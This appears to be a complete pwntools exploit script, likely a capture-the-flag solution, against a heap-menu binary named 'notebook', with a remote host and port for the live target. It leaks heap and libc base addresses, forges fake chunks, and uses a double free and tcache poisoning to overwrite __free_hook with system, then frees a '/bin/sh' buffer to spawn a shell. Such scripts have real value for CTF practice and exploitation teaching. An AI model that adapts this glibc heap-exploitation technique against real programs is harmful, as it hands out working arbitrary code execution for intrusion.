#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

ENCODING='ISO-8859-1'

local = 1
if local:
    p = process('./notebook')
    elf = ELF('./notebook')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31024)
    elf = ELF('./notebook')
    libc = ELF('./libc.so.6')

def add(name, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendafter(b'name> ', name)
    p.sendafter(b'content> ', content)

def remove(name):
    p.sendlineafter(b'>> ', b'2')
    p.sendafter(b'name> ', name)

def show(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'index> ', str(idx).encode())

def cal_idx(s):
    arr = s.ljust(16, b'\x00')
    return (arr[15] + 55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (55 * (arr[2] + 55 * (arr[1] + 55 * arr[0])) + arr[3]) + arr[4]) + arr[5]) + arr[6]) + arr[7]) + arr[8]) + arr[9]) + arr[10]) + arr[11]) + arr[12]) + arr[13]) + arr[14])) % 256

# leak libc & heap
for i in range(9):
    add(b'A\n', 0x18 * b'A' + b'\n') # 199
for i in range(8):
    remove(b'A\n')
show(199)
p.recvline()
p.recvline()
p.recvuntil(b'=> ')
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0xbd0
info('heap_base = ' + hex(heap_base))
p.recvuntil(b'=> ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

'''
# test double linked list
for i in range(7):
    add(b'A\n', 0x18 * b'A' + b'\n') # 199
for i in range(3):
    add(b'B\n', 0x18 * b'B' + b'\n') # 206
for i in range(7):
    remove(b'A\n')
for i in range(3):
    remove(b'B\n')
'''

#gdb.attach(p, 'b *$rebase(0x0000000000001957)\nb *$rebase(0x00000000000019B0)\nc')

# overwrite __free_hook <= double free
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
target = heap_base + 0x650
target_idx = cal_idx(p64(target))
info('target = ' + hex(target))
info('cal_idx(target) = ' + hex(target_idx))
#gdb.attach(p, 'b malloc\nc')
for i in range(8):
    add(b'B\n', 0x18 * b'B' + b'\n') # 206
    #input('@')
add(b'B\n', 0x1f8 * b'\x00' + p64(0x211)) # 206 # fake a chunk head at the end
for i in range(3):
    add(b'B\n', 0x18 * b'B' + b'\n') # 206
add(p64(0) + p64(0x31), p64(0) + p64(0x31) + p64(heap_base + 0x21b0) + 8 * p64(0) + p64(0x31) + p64(heap_base + 0x2140) + 4 * p64(0) + p64(0x31) + (b'\xff' + 14 * b'\x00' + b'\x9e') + p64(heap_base + 0x2220) +  2 * p64(0) + p64(0x211) + 8 * b'?' + b'\n') # another fake chunk
info('cal_idx(fake_chunk) = ' + hex(cal_idx(p64(0) + p64(0x31))))
#gdb.attach(p, 'b malloc\nc')
add(b'\xff' + 14 * b'\x00' + b'\x4a', 0x18 * b'!' + b'\n') # 213
for i in range(3):
    add(b'C\n', 0x18 * b'C' + b'\n') # 213
    #input('@')
#gdb.attach(p, 'b malloc\nc')
for i in range(3):
    add(p64(target) + b'\n', 0x18 * b'Z' + b'\n')
    #input('@')
add(chr(target_idx).encode(ENCODING).rjust(16, b'\x00'), 0x18 * b'X' + b'\n')
for i in range(3):
    remove(b'B\n')
for i in range(2):
    remove(p64(target) + b'\n')
add(p64(target) + b'\n', 0x18 * b'Z' + b'\n') # create a new node link to itself
remove(b'B\n')
remove(p64(target) + b'\n') # free once => put target's buffer chunk into tcache
for i in range(3):
    remove(b'C\n') # put into unsortedbin
for i in range(2):
    add(b'C\n', 0x18 * b'C' + b'\n') # 213 # get the freed target's buffer chunk from tcache
remove(p64(target) + b'\n') # free again => double free
for i in range(3):
    add(p64(heap_base + 0x2130) + b'\n', 0x18 * b'X' + b'\n')
for i in range(3):
    add(p64(heap_base + 0x2160) + p64(0x31), b'\n')
add(p64(heap_base + 0x21f0) + p64(0x211), b'\n')
#context.log_level = 'debug'
#gdb.attach(p, 'b *$rebase(0x0000000000001957)\nc')
remove(b'\xff' + 14 * b'\x00' + b'\x4a')
remove(b'\xff' + 14 * b'\x00' + b'\x9e') # chunk overlapping
add(b'D\n', 0x108 * b'Y' + 8 * p64(0x31) + p64(0x31) + 5 * p64(heap_base + 0x2330) + p64(0x211) + p64(free_hook) + b'\n') # forge next tcache at __free_hook
add(b'20220316' + b'\n', b'/bin/sh\x00' + b'\n')
add(b'D\n', p64(system) + b'\n') # overwrite __free_hook
remove(b'20220316' + b'\n')

#gdb.attach(p)

p.interactive()

